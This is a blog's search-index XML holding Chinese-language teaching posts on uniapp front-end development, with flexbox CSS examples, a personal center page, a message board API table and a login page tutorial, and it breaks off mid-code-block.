<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>移动应用开发赛题</title>
      <link href="/2024/03/25/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E8%B5%9B%E9%A2%98/"/>
      <url>/2024/03/25/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E8%B5%9B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="截屏工具"><a href="#截屏工具" class="headerlink" title="截屏工具"></a>截屏工具</h1><p><a href="http://10.163.72.39:4000/medias/article/移动应用开发赛题/Snipaste-2.8.5-Beta-x64.zip">截屏工具下载</a>&lt;&lt;&lt;戳这里</p><p>下载好之后解压，然后双击那个五颜六色的图标就运行了，接着按下<code>F1</code>就可以截屏了。</p><h1 id="通用步骤"><a href="#通用步骤" class="headerlink" title="通用步骤"></a>通用步骤</h1><p><strong>总结一个步骤给大家：</strong></p><ol><li><p>先划分好区域的宽高，可以设置一个背景颜色作为辅助，更加直观</p></li><li><p>把东西放进去</p></li><li><p>排列整齐（统一使用弹性盒子，一招鲜吃遍天嘛，就是横着排还是竖着排的问题）</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* 弹性盒子横着排 */</span><span class="token selector">.flex_row</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token comment">/*排列方向：横向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子竖着排 */</span><span class="token selector">.flex_column</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span><span class="token comment">/*排列方向：纵向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="个人中心页面"><a href="#个人中心页面" class="headerlink" title="个人中心页面"></a>个人中心页面</h1><img src="http://10.163.72.39:4000/medias/article/移动应用开发赛题/1-1.png" alt="个人中心页面-1" width="35%"><h2 id="标题栏"><a href="#标题栏" class="headerlink" title="标题栏"></a>标题栏</h2><p>如果你是创建的是uniapp项目，标题栏的修改在pages.json里。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"pages"</span><span class="token operator">:</span> <span class="token punctuation">[</span> <span class="token comment">//pages数组中第一项表示应用启动页，参考：https://uniapp.dcloud.io/collocation/pages</span><span class="token punctuation">{</span><span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"pages/index/index"</span><span class="token punctuation">,</span><span class="token property">"style"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"navigationBarTitleText"</span><span class="token operator">:</span> <span class="token string">"个人中心"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"globalStyle"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"navigationBarTextStyle"</span><span class="token operator">:</span> <span class="token string">"white"</span><span class="token punctuation">,</span><span class="token property">"navigationBarTitleText"</span><span class="token operator">:</span> <span class="token string">"uni-app"</span><span class="token punctuation">,</span><span class="token property">"navigationBarBackgroundColor"</span><span class="token operator">:</span> <span class="token string">"#1890ff"</span><span class="token punctuation">,</span><span class="token property">"backgroundColor"</span><span class="token operator">:</span> <span class="token string">"#F8F8F8"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"uniIdRouter"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户信息区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 左边的头像区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_section_left<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 80%<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 80%<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../static/头像.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 右边的信息区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_section_right<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>打工人<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> gray<span class="token punctuation">;</span>r</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>用户编号:123476578<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 菜单项 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>menu<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">margin</span><span class="token punctuation">:</span> 10px 0<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 左边区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>menu_left<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../static/设置.png<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>个人设置<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 右边的箭头区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>menu_right<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../static/右箭头.png<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">body</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> #ededed<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.user_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 15vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.user_section_left</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 30%<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> antiquewhite<span class="token punctuation">;</span><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.user_section_right</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 70%<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span><span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.menu</span><span class="token punctuation">{</span><span class="token property">height</span><span class="token punctuation">:</span> 8vh<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.menu_left</span><span class="token punctuation">{</span><span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 30%<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> pink<span class="token punctuation">;</span><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.menu_right</span><span class="token punctuation">{</span><span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 70%<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> cornflowerblue<span class="token punctuation">;</span><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token property">justify-content</span><span class="token punctuation">:</span> flex-end<span class="token punctuation">;</span><span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="http://10.163.72.39:4000/medias/article/移动应用开发赛题/1-2.png" alt="个人中心页面-2" width="35%"><img src="http://10.163.72.39:4000/medias/article/移动应用开发赛题/1-3.png" alt="个人中心页面-3" width="35%">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目教学 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端开发项目一留言板</title>
      <link href="/2024/02/26/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%A1%B9%E7%9B%AE%E2%80%94%E7%95%99%E8%A8%80%E6%9D%BF/"/>
      <url>/2024/02/26/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%A1%B9%E7%9B%AE%E2%80%94%E7%95%99%E8%A8%80%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p>大家现在掌握的知识已经足够完成这个任务了，所以本项目是开放性的项目，不需要再模仿抄写我的代码了，请大家自行设计。</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>你是全球知名的网页设计专家，现联合国将召开关于人类和平发展的会议，需要一个线上的交流平台，将你聘请为该论坛的首席设计专家，需要实现用户能够提交留言，并且显示所有用户的留言。</p><h2 id="后端文档"><a href="#后端文档" class="headerlink" title="后端文档"></a>后端文档</h2><h3 id="1、发送留言"><a href="#1、发送留言" class="headerlink" title="1、发送留言"></a>1、发送留言</h3><table><thead><tr><th>请求地址</th><th>请求方式</th></tr></thead><tbody><tr><td><a href="http://10.163.72.39:5555/message_add.php">http://10.163.72.39:5555/message_add.php</a></td><td>get</td></tr></tbody></table><table><thead><tr><th align="left">字段名称</th><th>备注</th><th>类型及长度</th><th align="left">是否必需</th><th>默认值</th></tr></thead><tbody><tr><td align="left">publisher</td><td>发布者</td><td>char(100)</td><td align="left">是</td><td>无</td></tr><tr><td align="left">content</td><td>发布内容</td><td>char(1000)</td><td align="left">是</td><td>无</td></tr></tbody></table><table><thead><tr><th>返回参数</th><th>字段</th></tr></thead><tbody><tr><td>msg</td><td>错误提示信息</td></tr><tr><td>error</td><td>错误状态标志，1为错误，0为无误</td></tr></tbody></table><h3 id="2、获取所有留言"><a href="#2、获取所有留言" class="headerlink" title="2、获取所有留言"></a>2、获取所有留言</h3><table><thead><tr><th>请求地址</th><th>请求方式</th></tr></thead><tbody><tr><td><a href="http://10.163.72.39:5555/message_get.php">http://10.163.72.39:5555/message_get.php</a></td><td>get</td></tr></tbody></table><table><thead><tr><th>返回参数</th><th>字段</th></tr></thead><tbody><tr><td>msg</td><td>错误提示信息</td></tr><tr><td>error</td><td>错误状态标志，1为错误，0为无误</td></tr><tr><td>data</td><td>所有留言数据</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目教学 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端开发项目一登录注册</title>
      <link href="/2024/02/25/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%A1%B9%E7%9B%AE%E4%B8%80%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C/"/>
      <url>/2024/02/25/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%A1%B9%E7%9B%AE%E4%B8%80%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>本课程是我第一次上，我去网上看了很多教学视频，也找别的老师借了很多书来看，有几点体会分享给大家。</p><ol><li>书上完全是线性结构化的，一个知识点一个知识点讲，网上各大平台的视频也差不多，你们可以去b站搜一下，动不动就是几百集，虽然耐心看完会有很多好处，知识是成体系的，缺点可能就是前期比较枯燥，需要有足够的耐心😪😪😪。</li><li>项目化就是通过做项目的方式，一边做项目，一边学习基础的知识，缺点是这样知识是零散的，不成体系，只会项目中用到的知识，没有用到的就不学了，考试的话比较吃亏，因为考试经常会出一些冷门的知识来考你。而且项目上手难度较大，和学科教学各有利弊，没有最完美的方法，只有最合适的方法，一般我们初学还是先按学科教学过一遍基础知识点，然后有一定积累之后再上手做项目，增强实战经验，掌握能够综合运用所学知识的能力。不能一味批判传统学科教学，也不能一味吹捧项目教学，两者应该结合，辩证地去看。</li><li>那到底本课程选择学科教学还是项目教学呢？我选择折中，一边做项目，一边整理知识点，因为你们没有基础，全靠一边做项目一边学习，所以我会尽可能最慢，最详细，你们不要嫌絮叨，咱们的进度已经很快了，正常来说html5的标签就可以学两个学期。</li></ol><h1 id="项目一、登录注册页面"><a href="#项目一、登录注册页面" class="headerlink" title="项目一、登录注册页面"></a>项目一、登录注册页面</h1><h2 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1.环境配置"></a>1.环境配置</h2><p>打开HBuilder X，点左上角的文件，新建一个项目，选择uniapp中的默认模板即可，项目名称随便取一个好了，就是这么简单。</p><p>如果自己在家想学习的，就去下个软件安装就完事了，<a href="https://www.dcloud.io/hbuilderx.html">https://www.dcloud.io/hbuilderx.html</a> ，一直下一步下一步就装好了，绝对比你安装游戏简单。</p><p><strong>注意：</strong>我在机房已经安装帮你们都安装好了，你们打开就可以直接写代码，有同学问上面那个链接怎么访问不了，那个是外网的官网地址，机房没有开外网，你当然访问不了，但是如果你在家里也想学习的话，就可以通过官网下载软件自学。</p><p><strong>答疑：</strong>有同学又问我的这个网站为什么在机房可以访问，但是在家又打不开，这是因为我的网站10.163.72.39是部署在学校内网的，内网是只有学校内部才可以访问，但是有同学在家也想学习，于是我将网页部署到一台公网服务器上了，你可以通过公网域名：xiaolily.cn访问，域名服务器这些东西都是要花钱的，但只要你肯学习一切都值。</p><h2 id="2-初始项目"><a href="#2-初始项目" class="headerlink" title="2.初始项目"></a>2.初始项目</h2><p>pages目录中放的是我们的页面文件，项目自动帮我们创建好了一个index目录，index就是首页的意思，我们找到其中的index.vue，双击它，然后再点击右上角的预览，我们就可以先看到初始项目中别人帮我们写好的一个参考案例是长什么样的。</p><p>我们先分析一下网页结构吧，前端分为三件套。</p><table><thead><tr><th>三件套</th><th>作用</th><th>所属区域</th></tr></thead><tbody><tr><td>html</td><td>网页结构，相当于房屋主体结构</td><td><code>&lt;template&gt;&lt;/template&gt;</code></td></tr><tr><td>css</td><td>网页样式，相当于房子里的装修</td><td><code>&lt;style&gt;&lt;/style&gt;</code></td></tr><tr><td>JavaScript</td><td>脚本语言，复制复杂的交互逻辑，用来给网页增加动态功能，相当于房子里的家电</td><td><code>&lt;script&gt;&lt;/script&gt;</code></td></tr></tbody></table><p>因为html、css和JavaScript处于同一个文件里，它们都有属于自己的区域，不然就乱套了，就像不同专业的同学是在不同的班级上课，参考上述表格，例如html需要写在<code>&lt;template&gt;&lt;/template&gt;</code>标签里。</p><p>现在我们就开始写我们的第一个程序吧，按照不成文的惯例，我们的第一个程序毫无疑问都是要写一个hello Word，但是每个网页都要有一个主体的结构，一般我们会使用<code>body</code>标签，body标签表示网站的主体内容，我们输入以下代码，点击右上角的预览按钮打开内置浏览器，并同时按下ctrl+s保存，这样就可以在内置浏览器中看到效果了。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>        helloWorld<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>易错点：</strong><code>body</code>标签只能有一个，因为每个页面只能有一个主体的标签，否则会报错。</p><p>以下代码会报错，因为有两个主体的标签。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>        helloWorld<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>        helloWorld<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-基础布局"><a href="#3-基础布局" class="headerlink" title="3.基础布局"></a>3.基础布局</h2><p>第一步一般都是先规划好网页的布局，那就来分析一下整个页面的布局吧，就是最外层的容器body，页面是一个最简单的从上到下的布局，简单来说就是竖着排，从上到下依次是标题栏，图片区域，输入区域，登录按钮。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 网页主体 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 图片区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 按钮区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.title_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 10vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> antiquewhite<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.image_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 25vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.input_secition</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkseagreen<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 20vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> pink<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" 